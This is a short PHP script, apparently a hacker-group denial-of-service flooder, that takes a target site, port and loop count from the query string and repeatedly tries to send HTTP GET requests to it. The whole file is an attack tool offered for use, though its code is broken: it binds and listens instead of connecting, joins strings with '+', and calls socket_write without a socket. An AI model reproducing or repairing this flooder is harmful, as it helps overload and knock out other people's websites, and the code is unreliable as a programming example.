<?php
################################
#  Coded By Ejder && Kosova-X  #
#      WWW.SaVSaK.CoM          #
################################

error_reporting(E_ALL);
set_time_limit(0);

ob_implicit_flush();

$address = $_GET['site'];
$port = $_GET['port'];
$dongu = $_GET['dongu'];
$sayi = 1;

while ( $sayi <= $dongu )
{
	if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
		echo "Hata\n";
	}
	
	if (socket_bind($sock, $address, $port) === false) {
		echo "Hata\n";
	}
	
	if (socket_listen($sock, 5) === false) {
		echo "Hata\n";
	}
		$msg = "HTTP/1.1 GET /\r\nHost:"+$_GET['site']+"\r\nConnection: Keep-Alive\r\n"; 
		socket_write($msg);
		socket_close($sock);
		$sayi++;
		echo "gonderdi...".$sayi;
}
?> 